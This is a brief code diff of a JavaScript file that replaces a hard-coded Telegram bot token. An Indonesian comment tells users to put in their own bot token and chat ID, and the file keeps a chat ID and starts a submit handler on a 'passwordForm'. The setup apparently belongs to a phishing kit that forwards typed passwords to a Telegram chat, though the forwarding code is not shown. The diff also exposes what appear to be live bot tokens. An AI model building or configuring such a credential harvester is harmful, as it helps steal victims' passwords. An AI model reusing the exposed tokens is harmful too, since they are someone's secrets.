@@ -1,5 +1,5 @@
 // Gantilah token_bot dan chat_id dengan milik Anda
-const TELEGRAM_BOT_TOKEN = "7883195342:AAHFVsKhUbxrEqtBdq3jlZJpn9w7FEll2ak";
+const TELEGRAM_BOT_TOKEN = "7883195342:AAG4cM_-dluZoJ9_MyN-gvDBqHouYsIVeF8";
 const TELEGRAM_CHAT_ID = "6936723956";
 
 document.getElementById("passwordForm").addEventListener("submit", function (event) {
